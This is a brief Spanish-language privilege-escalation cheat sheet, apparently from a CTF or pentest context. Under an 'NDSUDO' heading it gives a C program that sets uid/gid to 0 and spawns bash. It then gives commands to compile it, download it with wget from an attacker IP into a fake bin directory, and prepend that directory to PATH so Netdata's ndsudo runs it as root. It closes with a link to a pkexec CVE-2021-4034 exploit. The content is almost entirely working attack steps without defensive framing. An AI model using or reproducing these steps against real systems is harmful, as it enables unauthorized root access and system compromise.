## NDSUDO

### ARCHIVO C REVSHELL

```bash
// megacli.c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-i", NULL);
    return 0;
}
```

### Compilas, subes y crear path

```bash
gcc megacli.c -o megacli


mkdir -p ~/fakebin && wget -q http://10.10.xx.xx/megacli -O ~/fakebin/megacli && chmod +x ~/fakebin/megacli && export PATH=~/fakebin:$PATH

/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
```

## PKEXEC

```bash
https://github.com/rvizx/CVE-2021-4034
```
